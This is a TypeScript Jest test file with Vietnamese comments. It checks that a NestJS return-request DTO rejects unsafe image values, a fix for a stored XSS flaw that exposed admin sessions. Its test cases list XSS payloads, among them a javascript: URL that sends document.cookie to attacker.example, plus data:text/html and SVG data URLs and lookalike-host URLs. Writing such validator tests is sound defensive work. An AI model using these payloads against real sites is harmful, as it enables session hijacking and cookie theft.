import 'reflect-metadata';
import { ValidationPipe } from '@nestjs/common';
import { ReturnRequestDto } from './return-request.dto';

/** Đúng cấu hình ValidationPipe toàn cục ở main.ts. */
const pipe = new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true });
const asBody = (value: Record<string, unknown>) =>
  pipe.transform(value, { type: 'body', metatype: ReturnRequestDto, data: undefined });

const reason = 'Cây bị dập lá khi nhận';
const JPEG_DATA_URL = `data:image/jpeg;base64,${'A'.repeat(400)}==`;

// C-050 (A5N-05): images trước đây chỉ @IsString → khách lưu được "javascript:..." và admin bấm ảnh là chạy
// mã trong phiên admin. Chỉ nhận ảnh upload thật: https trên host Cloudinary hoặc ảnh base64 raster mà
// ImageUpload của miniapp dùng làm fallback khi chưa cấu hình Cloudinary.
describe('ReturnRequestDto.images (C-050)', () => {
  it.each([
    ["javascript:fetch('https://attacker.example/x?'+document.cookie)"],
    ['JavaScript:alert(1)'],
    ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    ['data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='],
    ['http://res.cloudinary.com/demo/image/upload/a.jpg'],
    ['https://attacker.example/a.jpg'],
    ['https://res.cloudinary.com.attacker.example/a.jpg'],
    ['//res.cloudinary.com/demo/image/upload/a.jpg'],
    ['vbscript:msgbox(1)'],
    ['data:image/jpeg;base64,<script>'],
  ])('từ chối %s', async (img) => {
    await expect(asBody({ reason, images: [img] })).rejects.toThrow();
  });

  it('từ chối nếu chỉ một ảnh xấu lẫn trong mảng', async () => {
    await expect(
      asBody({ reason, images: ['https://res.cloudinary.com/demo/image/upload/a.jpg', 'javascript:alert(1)'] }),
    ).rejects.toThrow();
  });

  it('từ chối ảnh base64 quá khổ (chặn payload khổng lồ)', async () => {
    await expect(asBody({ reason, images: [`data:image/jpeg;base64,${'A'.repeat(1_600_000)}`] })).rejects.toThrow();
  });

  it('nhận URL https Cloudinary và ảnh base64 raster', async () => {
    const dto = (await asBody({
      reason,
      images: ['https://res.cloudinary.com/demo/image/upload/v1/returns/a.jpg', JPEG_DATA_URL, 'data:image/png;base64,iVBORw0KGgo='],
    })) as ReturnRequestDto;
    expect(dto.images).toHaveLength(3);
  });

  it('không gửi ảnh vẫn hợp lệ; lý do tối đa 500 ký tự (tối thiểu 5 kiểm ở service khi không chọn lý do sẵn); tối đa 6 ảnh', async () => {
    await expect(asBody({ reason })).resolves.toBeDefined();
    await expect(asBody({ reason: 'x'.repeat(501) })).rejects.toThrow();
    await expect(asBody({ reason, images: Array(7).fill(JPEG_DATA_URL) })).rejects.toThrow();
  });

  it('D3: dòng + số lượng, lý do chọn sẵn và nơi nhận tiền hoàn hợp lệ; giá trị lạ bị chặn', async () => {
    const ok = (await asBody({
      reasonCode: 'DEFECTIVE',
      items: [{ orderItemId: 'oi1', quantity: 2 }],
      refundMethod: 'BANK',
      bankName: 'Techcombank',
      accountNumber: '190312345678',
      accountName: 'NGUYEN VAN A',
    })) as ReturnRequestDto;
    expect(ok.items?.[0]).toMatchObject({ orderItemId: 'oi1', quantity: 2 });
    await expect(asBody({ reasonCode: 'BORED' })).rejects.toThrow();
    await expect(asBody({ items: [{ orderItemId: 'oi1', quantity: 0 }] })).rejects.toThrow();
    await expect(asBody({ items: [] })).rejects.toThrow();
    await expect(asBody({ reason, refundMethod: 'CASH' })).rejects.toThrow();
  });
});
